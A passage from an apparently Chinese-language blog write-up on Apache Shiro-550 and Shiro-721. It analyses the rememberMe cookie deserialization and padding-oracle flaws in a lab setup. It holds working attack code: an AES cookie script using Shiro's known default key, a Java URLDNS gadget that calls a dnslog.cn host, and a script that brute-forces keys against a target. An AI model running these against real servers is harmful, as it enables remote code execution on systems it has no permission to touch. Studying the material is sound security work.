class="string">&quot;Path to the file to encrypt or decrypt&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--data&#x27;</span>,<span class="string">&#x27;-d&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;Base64 encoded data to decrypt directly (for decryption only)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--output&#x27;</span>,<span class="string">&#x27;-o&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;Output file path for the decrypted data&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--key&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;Base64 encoded key for encryption/decryption (default: &#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;)&quot;</span>)     </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用用户提供的key或者默认值</span></span><br><span class="line">    key = args.key <span class="keyword">if</span> args.key <span class="keyword">else</span> <span class="string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.operation == <span class="string">&#x27;en&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> args.file <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;File path must be provided for encryption.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        data = get_file_data(args.file)</span><br><span class="line">        encrypted_data = aes_enc(data, key)</span><br><span class="line">        <span class="built_in">print</span>(encrypted_data.decode())</span><br><span class="line">    <span class="keyword">elif</span> args.operation == <span class="string">&#x27;de&#x27;</span>:</span><br><span class="line">        decrypted_data = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> args.data:</span><br><span class="line">            decrypted_data = aes_dec(args.data.encode(), key)</span><br><span class="line">        <span class="keyword">elif</span> args.file:</span><br><span class="line">            encrypted_data = get_file_data(args.file)</span><br><span class="line">            decrypted_data = aes_dec(encrypted_data, key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Either file path or data must be provided for decryption.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> decrypted_data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> args.output:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(decrypted_data)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Decrypted data has been written to <span class="subst">&#123;args.output&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Decrypted data (binary output requires --output to save to file).&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Decryption failed.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h5 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNSEXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        <span class="comment">// 这里不要发起请求</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://zj9hsb.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefile</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefile.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefile.set(url,<span class="number">114514</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性</span></span><br><span class="line">        hashcodefile.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;dns.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727200645846.png"
+                        alt="image-20240727200645846"
+                 ></p>
+<p>再将 AES 加密出来的编码替换包中的 RememberMe Cookie，将 JSESSIONID 删掉，因为当存在 JSESSIONID 时，会忽略 rememberMe。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727200653967.png"
+                        alt="image-20240727200653967"
+                 ></p>
+<p>可以收到DNS请求</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240727200712766.png"
+                        alt="image-20240727200712766"
+                 ></p>
+<h4 id="AES密钥判断"><a href="#AES密钥判断" class="headerlink" title="AES密钥判断"></a>AES密钥判断</h4><blockquote>
+<p>前面说到 Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。  但是即使升级到了1.2.4以上的版本，很多开源的项目会自己设定密钥。可以收集密钥的集合，或者对密钥进行爆破。</p>
+<blockquote>
+<p>那么如何判断密钥是否正确呢？文章 <a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&mid=2247485052&idx=1&sn=b007a722e233b45982b7a57c3788d47d&scene=21#wechat_redirect" >一种另类的 shiro 检测方式<i class="fas fa-external-link-alt"></i></a>提供了思路，<strong>当密钥不正确或类型转换异常时</strong>，目标 Response 包含 <code>Set-Cookie：rememberMe=deleteMe</code> 字段，而<strong>当密钥正确且没有类型转换异常时</strong>，返回包不存在 <code>Set-Cookie：rememberMe=deleteMe</code> 字段。</p>
+<p>因此我们需要构造 payload 排除类型转换错误，进而准确判断密钥。</p>
+<p>shiro 在 1.4.2 版本之前， AES 的模式为 CBC， IV 是随机生成的，并且 IV 并没有真正使用起来，所以整个 AES  加解密过程的 key 就很重要了，正是因为 AES 使用 Key 泄漏导致反序列化的 cookie 可控，从而引发反序列化漏洞。在 1.4.2  版本后，shiro 已经更换加密模式 AES-CBC 为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p>
+<p>这里给出大佬 Veraxy 的脚本：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_AES_GCM</span>(<span class="params">msg, secretKey</span>):</span><br><span class="line">    aesCipher = AES.new(secretKey, AES.MODE_GCM)</span><br><span class="line">    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)</span><br><span class="line">    <span class="keyword">return</span> (ciphertext, aesCipher.nonce, authTag)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">target</span>):</span><br><span class="line">    keys = [<span class="string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>, <span class="string">&#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;</span>,<span class="string">&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;</span>, <span class="string">&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;</span>]     <span class="comment"># 此处简单列举几个密钥</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line"> 	file_body = base64.b64decode(<span class="string">&#x27;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># CBC加密</span></span><br><span class="line">            encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))</span><br><span class="line">            res = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;,timeout=<span class="number">3</span>,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;正确KEY ：&quot;</span> + key)</span><br><span class="line">                <span class="keyword">return</span> key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;正确key:&quot;</span> + key)</span><br><span class="line">                    <span class="keyword">return</span> key</span><br><span class="line">            <span class="comment"># GCM加密</span></span><br><span class="line">            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))</span><br><span class="line">            base64_ciphertext = base64.b64encode(encryptedMsg[<span class="number">1</span>] + encryptedMsg[<span class="number">0</span>] + encryptedMsg[<span class="number">2</span>])</span><br><span class="line">            res = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="number">3</span>, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>) == <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;正确KEY:&quot;</span> + key)</span><br><span class="line">                <span class="keyword">return</span> key</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;正确key:&quot;</span> + key)</span><br><span class="line">                    <span class="keyword">return</span> key</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正确key:&quot;</span> + key)</span><br><span class="line">            <span class="keyword">return</span> key</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure></blockquote>
+</blockquote>
+<h2 id="Shiro-721分析"><a href="#Shiro-721分析" class="headerlink" title="Shiro-721分析"></a>Shiro-721分析</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>还是参照<a class="link"   target="_blank" rel="noopener" href="https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA" >师傅的环境搭建<i class="fas fa-external-link-alt"></i></a></p>
+<p>或者还有dokcer环境可以去找找</p>
+<p>搭建的过程中发现怎么无论怎样重启key还是<code>kPH+bIxk5D2deZiIxcaaaA==</code>还是固定的</p>
+<p>直接全局搜索找到事发地然后注释就好了</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240729180844472.png"
+                        alt="image-20240729180844472"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240729180658031.png"
+                        alt="image-20240729180658031"
+                 ></p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><h5 id="与Shiro550的区别"><a href="#与Shiro550的区别" class="headerlink" title="与Shiro550的区别"></a>与Shiro550的区别</h5><p>和Shiro550的差别就在于密钥生成变成了动态生成的了</p>
+<p>我们对比一下两个生成密钥的地方</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240729182538425.png"
+                        alt="image-20240729182538425"
+                 ></p>
+<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p>[<a class="link"   target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-721" >SHIRO-721]RememberMe 填充 Oracle 漏洞 - ASF JIRA (apache.org)<i class="fas fa-external-link-alt"></i></a></p>
+<p>全是英文思密达</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240729181758523.png"
+                        alt="image-20240729181758523"
+                 ></p>
+<p>漏洞影响版本是 1.2.5 &lt;&#x3D; Apache Shiro &lt;&#x3D; 1.4.1</p>
+<p>Apache Shiro Padding Oracle Attack 的漏洞利用必须满足如下前提条件：</p>
+<ul>
+<li>开启 rememberMe 功能；</li>
+<li>rememberMe 值使用 AES-CBC 模式解密；</li>
+<li>能获取到正常 Cookie，即用户正常登录的 Cookie 值；</li>
+<li>密文可控；</li>
+</ul>
+<h4 id="分析过程-1"><a href="#分析过程-1" class="headerlink" title="分析过程"></a>分析过程</h4><p>既然与前面分析的Shiro550区别只在生成密钥这点那么我们就看一下生成密钥的这个过程</p>
+<p>Ps：这个打断点的过程要多试不是一次打完的</p>
+<p>先在生成密钥的函数(<code>generateNewKey()</code>)地方打上断点</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240729190642366.png"
+                        alt="image-20240729190642366"
+                 ></p>
+<p><code>KeyGenerator</code>是 Java 中用来生成对称密钥的类。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240729190845306.png"
+                        alt="image-20240729190845306"
+                 ></p>
+<p>跟进这个<code>init()</code>看看</p>
+<p>这里获取到了一个随机数生成器 <code>SecureRandom</code>， 跟进 <code>init()</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240729191858511.png"
+                        alt="image-20240729191858511"
+                 ></p>
+<p>跟进<code>engineInit</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240729192141240.png"
+                        alt="image-20240729192141240"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240729192302699.png"
+                        alt="image-20240729192302699"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240729192550537.png"
+                        alt="image-20240729192550537"
+                 ></p>
+<p>就是进行了 AES 算法的初始化</p>
+<p>所以整个init就是对加密算法进行的初始化，我们结束这个地方的跟进</p>
+<p>看一眼这个<code>generateKey()</code>看名字就感觉是生成key的地方</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240729193733392.png"
+                        alt="image-20240729193733392"
+                 ></p>
+<p>其中<code>SecretKeySpec</code> 是一种 <code>SecretKey</code> 实现，封装了原始密钥数据和算法名称，最后返回的var1这个对象包含了生成的随机密钥和算法信息</p>
+<p>可见这里已经生成了一串16字节的随机序列，并且返回一个 <code>SecretKeySpec</code> 对象</p>
+<p>然后再使用<code>getEncoded()</code> 方法获取 <code>key</code> 密钥序列</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240729194005656.png"
+                        alt="image-20240729194005656"
+                 ></p>
+<p>至此Shiro721的密钥就生成完毕了</p>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>Shiro721漏洞利用主要就是通过Padding Oracle Attack</p>
+<h5 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h5><p>这里直接借用师傅的分析</p>
+<blockquote>
+<p>这里简单说下 Padding Oracle Attack 加密数据整体过程：</p>
+<ol>
+<li>选择一个明文 <code>P</code>，用来生成你想要的密文<code>C</code>；</li>
+<li>使用适当的 Padding 将字符串填充为块大小的倍数，然后将其拆分为从 1 到 N 的块；</li>
+<li>生成一个随机数据块（<code>C[n]</code> 表示最后一个密文块）；</li>
+<li>对于每一个明文块，从最后一块开始：<ol>
+<li>创建一个包括两块的密文C’，其是通过一个空块（00000…）与最近生成的密文块<code>C[n+1]</code>（如果是第一轮则是随机块）组合成的；</li>
+<li>这步容易理解，就是Padding Oracle的基本攻击原理：修改空块的最后一个字节直至Padding  Oracle没有出现错误为止，然后继续将最后一个字节设置为2并修改最后第二个字节直至Padding  Oracle没有出现错误为止，依次类推，继续计算出倒数第3、4…个直至最后一个数据为止；</li>
+<li>在计算完整个块之后，将它与明文块 <code>P[n]</code> 进行XOR一起创建 <code>C[n]</code>；</li>
+<li>对后续的每个块重复上述过程（在新的密文块前添加一个空块，然后进行Padding Oracle爆破计算）；</li>
+</ol>
+</li>
+</ol>
+<p>简单地说，每一个密文块解密为一个未知值，然后与前一个密文块进行XOR。通过仔细选择前一个块，我们可以控制下一个块解密来得到什么。即使下一个块解密为一堆无用数据，但仍然能被XOR化为我们控制的值，因此可以设置为任何我们想要的值。</p>
+</blockquote>
+<h5 id="Shiro721的Padding-Oracle-Attack"><a href="#Shiro721的Padding-Oracle-Attack" class="headerlink" title="Shiro721的Padding Oracle Attack"></a>Shiro721的Padding Oracle Attack</h5><blockquote>
+<p>要成功进行 Padding Oracle Attack 是需要服务端返回两个不同的响应特征来进行 Bool 判断的。</p>
+<p>在 Apache Shiro 的场景中，这个服务端的两个不同的响应特征为：</p>
+<ul>
+<li>Padding Oracle 错误时，服务端响应报文的 Set-Cookie 头字段返回 <code>rememberMe=deleteMe</code>；</li>
+<li>Padding Oracle 正确时，服务端返回正常的响应报文内容；</li>
+</ul>
+</blockquote>
+<p>这个Padding Oracle Attack我们是拿来作用到Cookie上的，又是通过响应头来判断填充是否正确，所以我们来分析一下Shiro是如果处理正确和错误的Cookie的</p>
+<p>我们先找到解密的地方<code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt()</code> </p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730112514908.png"
+                        alt="image-20240730112514908"
+                 ></p>
+<p>跟进<code>decrypt</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730112617309.png"
+                        alt="image-20240730112617309"
+                 ></p>
+<p>跟进 <code>cipherService.decrypt()</code>，最后到 <code>crypt()</code> 中调用 <code>doFinal()</code> 方法</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730112649401.png"
+                        alt="image-20240730112649401"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730112705636.png"
+                        alt="image-20240730112705636"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730112901284.png"
+                        alt="image-20240730112901284"
+                 ></p>
+<p><code>doFinal()</code> 方法有 <code>IllegalBlockSizeException</code>和<code>BadPaddingException</code> 这两个异常，分别用于捕获块大小异常和填充错误异常。异常会被抛出到 <code>crypt()</code> 方法中，最终被 <code>getRememberedPrincipals()</code> 方法捕获，并执行 <code>onRememberedPrincipalFailure()</code> 方法。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730112938439.png"
+                        alt="image-20240730112938439"
+                 ></p>
+<p><code>onRememberedPrincipalFailure()</code> 方法调用了 <code>forgetIdentity()</code>。该方法会调用 <code>removeFrom()</code>，并且会在response头部添加字段 <code>Set-Cookie: rememberMe=deleteMe</code></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730113249142.png"
+                        alt="image-20240730113249142"
+                 ></p>
+<p>因此倘若Padding结果不正确的话，响应包就会返回 <code>Set-Cookie: rememberMe=deleteMe</code> </p>
+<p>当Padding正确时进行反序列化处理，CBC模式下的分组密码，如果某一组的密文被破坏，那么在其之后的分组都会受到影响。这时候我们的密文就无法正确的被反序列化了。</p>
+<p>Shiro中关于反序列化的处理在 <code>org.apache.shiro.io.DefaultSerializer#deserialize()</code> 方法下	</p>
+<p>(如果不想打断点就可以找<code>AbstractRememberMeManager</code>这个类很多都能从这出发找到)<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730113637858.png"
+                        alt="image-20240730113637858"
+                 ></p>
+<p>如果反序列化的结果错误，则会抛出异常，最后异常仍被 <code>getRememberedPrincipals()</code> 方法处理。response 包里会回显 302 且 <code>rememberMe=deleteMe</code></p>
+<p>但是对于 Java 来说，反序列化是以 Stream 的方式按顺序进行的，向其后添加或更改一些字符串并不会影响正常反序列化。我们可以来测试一下。</p>
+<p>我们先获得正常Cookie</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730123911776.png"
+                        alt="image-20240730123911776"
+                 ></p>
+<p>进行解密</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730123932596.png"
+                        alt="image-20240730123932596"
+                 ></p>
+<p>放到010看到填充数据0x10</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730123950999.png"
+                        alt="image-20240730123950999"
+                 ></p>
+<p>我们更改为其他合理填充数据，加密后再发送</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730151427517.png"
+                        alt="image-20240730151427517"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730124303028.png"
+                        alt="image-20240730124303028"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730124159211.png"
+                        alt="image-20240730124159211"
+                 ></p>
+<p>服务器端正常响应，于是这里就构造出了布尔条件</p>
+<ul>
+<li>Padding 正确，服务器正常响应</li>
+<li>Padding 错误，服务器返回 <code>Set-Cookie: rememberMe=deleteMe</code></li>
+</ul>
+<h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial" >ysoserial<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/inspiringz/Shiro-721" >inspiringz&#x2F;Shiro-721: Shiro-721 RCE Via RememberMe Padding Oracle Attack (github.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p>先登录进去勾选Remember Me</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730161459890.png"
+                        alt="image-20240730161459890"
+                 ></p>
+<p>刷新当前页面或访问 <code>/account</code> 页面，获取此时登录成功的 rememberMe 值：</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730161659302.png"
+                        alt="image-20240730161659302"
+                 ></p>
+<p>用ysoserial生成DNS payload</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20240730161729146.png"
+                        alt="image-20240730161729146"
+                 ></p>
+<p>利用<a class="link"   target="_blank" rel="noopener" href="https://github.com/3ndz/Shiro-721" >GitHub的exp<i class="fas fa-external-link-alt"></i></a>来进行 Padding Oracle Attack(python2)</p>
